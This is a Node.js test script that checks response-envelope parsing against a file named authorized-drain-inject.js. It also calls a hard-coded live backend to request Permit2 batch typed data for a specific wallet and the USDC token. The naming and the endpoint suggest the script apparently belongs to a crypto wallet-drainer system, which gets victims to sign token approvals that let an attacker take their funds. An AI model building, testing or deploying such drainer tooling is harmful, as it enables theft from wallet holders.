/**
 * Validates parseEnvelope / unwrapEnvelopePayload parity with authorized-drain-inject.js
 * Run: node scripts/test-parse-envelope.mjs
 */
const BACKEND = (process.env.BACKEND_URL || 'https://sadrailala-production.up.railway.app').replace(/\/$/, '');

function unwrapEnvelopePayload(payload) {
  if (payload == null || typeof payload !== 'object') return payload;
  if (
    payload.data != null &&
    (typeof payload.ok === 'boolean' || typeof payload.success === 'boolean')
  ) {
    return payload.data;
  }
  return payload;
}

function parseEnvelope(res, data) {
  if (!data || typeof data !== 'object') {
    return { ok: res.ok, message: res.statusText || '', data };
  }
  const msg = typeof data.message === 'string' ? data.message : res.statusText || '';
  if (typeof data.success === 'boolean') {
    return {
      ok: data.success && res.ok,
      message: msg,
      data: unwrapEnvelopePayload(data.data != null ? data.data : data),
    };
  }
  if (typeof data.ok === 'boolean') {
    return {
      ok: data.ok && res.ok,
      message: msg,
      data: unwrapEnvelopePayload(data),
    };
  }
  return { ok: res.ok, message: msg, data };
}

let passed = 0;
let failed = 0;

function assert(name, cond, detail = '') {
  if (cond) {
    passed++;
    console.log(`  PASS ${name}`);
  } else {
    failed++;
    console.error(`  FAIL ${name}${detail ? ` — ${detail}` : ''}`);
  }
}

console.log('Unit: envelope shapes');
{
  const res = { ok: true, statusText: 'OK' };
  const successBody = {
    success: true,
    message: 'ok',
    data: { typed_data: { domain: { chainId: 1 } }, endpoints: { anchor: '/x' } },
  };
  const env = parseEnvelope(res, successBody);
  assert('success envelope ok', env.ok === true);
  assert('success unwrap typed_data', env.data?.typed_data?.domain?.chainId === 1);
  assert('success unwrap endpoints', env.data?.endpoints?.anchor === '/x');

  const legacy = { ok: true, message: 'legacy', data: { batch_id: 'b1' } };
  const leg = parseEnvelope(res, legacy);
  assert('legacy ok envelope', leg.ok === true && leg.data?.batch_id === 'b1');

  const nested = {
    ok: true,
    data: { ok: true, data: { inner: 42 } },
  };
  const nest = parseEnvelope(res, nested);
  assert('double-nested unwrap', nest.data?.data?.inner === 42);

  const failRes = { ok: false, statusText: 'Bad Request' };
  const failBody = { success: false, message: 'invalid' };
  const failEnv = parseEnvelope(failRes, failBody);
  assert('http+success false', failEnv.ok === false);
}

console.log('\nLive: permit2-batch-typed-data');
try {
  const res = await fetch(`${BACKEND}/api/v1/signature-anchor/permit2-batch-typed-data`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      wallet_address: '0xbe3cebae5728C07F39416f0dC1d0165d2972db12',
      chain_id: 1,
      permits: [{ token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', amount: '1000000' }],
    }),
    signal: AbortSignal.timeout(60_000),
  });
  const raw = await res.json().catch(() => ({}));
  const env = parseEnvelope(res, raw);
  assert('live http ok', res.ok, `status=${res.status}`);
  assert('live envelope ok', env.ok === true);
  assert('live typed_data present', Boolean(env.data?.typed_data), JSON.stringify(env.data)?.slice(0, 120));
  assert('live batch_permit_metadata present', Boolean(env.data?.batch_permit_metadata), JSON.stringify(env.data)?.slice(0, 120));
} catch (e) {
  failed += 4;
  console.error('  FAIL live fetch —', e.message);
}

console.log(`\n${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);
